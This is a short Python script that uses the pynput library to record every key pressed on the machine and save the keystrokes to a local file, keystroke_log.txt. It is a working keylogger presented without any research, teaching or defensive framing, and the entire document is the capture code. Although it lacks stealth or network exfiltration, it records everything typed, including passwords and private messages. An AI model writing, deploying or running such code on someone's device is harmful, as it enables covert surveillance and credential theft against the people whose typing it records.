from pynput import keyboard


log = ""


def on_press(key):
    global log
    try:
        log = log + str(key.char)  
    except AttributeError:
        log = log + " " + str(key) + " "  


with keyboard.Listener(on_press=on_press) as listener:
    try:
        listener.join()  
    except KeyboardInterrupt:
        pass


with open("keystroke_log.txt", "w") as f:
    f.write(log)

print("Keystrokes logged successfully.")
